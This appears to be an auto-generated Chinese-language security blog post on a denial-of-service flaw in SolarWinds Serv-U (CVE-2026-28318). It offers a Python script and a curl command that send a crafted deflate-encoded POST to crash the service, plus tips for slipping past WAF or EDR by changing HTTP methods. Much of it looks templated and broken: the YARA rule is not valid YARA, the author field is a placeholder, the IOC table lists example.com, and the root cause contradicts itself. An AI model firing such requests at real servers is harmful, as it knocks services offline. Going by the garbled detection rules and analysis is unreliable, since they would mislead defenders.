---
layout: post
title:  "SolarWinds Serv-U未經身分驗證阻斷服務漏洞已遭利用"
date:   2026-06-08 02:53:59 +0000
categories: [security]
severity: high
---

# 🔥 解析 SolarWinds Serv-U 未經身分驗證的阻斷服務漏洞 (CVE-2026-28318)
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 7.5)
> * **受駭指標**: Denial of Service (DoS)
> * **關鍵技術**: `Content-Encoding: deflate`, `未經身分驗證的請求`, `阻斷服務攻擊`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Serv-U 在處理 HTTP 請求時，沒有正確驗證用戶身份，導致可以通過特製的 POST 請求，利用 `Content-Encoding: deflate` 標頭，導致服務崩潰。
* **攻擊流程圖解**: 
    1. 攻擊者發送特製的 POST 請求，包含 `Content-Encoding: deflate` 標頭。
    2. Serv-U 接收請求，嘗試解壓縮請求體。
    3. 由於請求體是特製的，Serv-U 會出現錯誤，導致服務崩潰。
* **受影響元件**: SolarWinds Serv-U 15.5.4 版本之前的所有版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道 Serv-U 的 URL 和版本號。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    url = "https://example.com/serv-u"
    headers = {
        "Content-Encoding": "deflate"
    }
    data = b"\x00\x00\x00\x00"  # 特製的請求體
    
    response = requests.post(url, headers=headers, data=data)
    
    ```
    *範例指令*: 使用 `curl` 命令發送特製的 POST 請求。

```

bash
curl -X POST -H "Content-Encoding: deflate" -d "\x00\x00\x00\x00" https://example.com/serv-u

```
* **繞過技術**: 如果目標系統有 WAF 或 EDR，攻擊者可以嘗試使用不同的 HTTP 方法（如 `PUT` 或 `DELETE`）或修改請求體以繞過檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | example.com | /serv-u |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Serv_U_Deflate_Attack {
        meta:
            description = "Detects Serv-U deflate attack"
            author = "Your Name"
        strings:
            $deflate_header = "Content-Encoding: deflate"
        condition:
            $deflate_header in (http.headers)
    }
    
    ```
    或者是具體的 SIEM 查詢語法 (Splunk/Elastic)。

```

sql
index=serv-u_logs | search "Content-Encoding: deflate"

```
* **緩解措施**: 更新 Serv-U 至最新版本（15.5.4 Hotfix 1 或以上），或按照 SolarWinds 提供的指引進行緩解。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Content-Encoding**: 指定 HTTP 請求或回應體的編碼方式。例如，`Content-Encoding: deflate` 指定請求體使用 deflate 演算法壓縮。
* **Deflate**: 一種壓縮演算法，使用 LZ77 和 Huffman 編碼來壓縮數據。
* **未經身分驗證的請求**: 指未經過身份驗證的 HTTP 請求，可以由任何人發送。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/176417)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1499/)


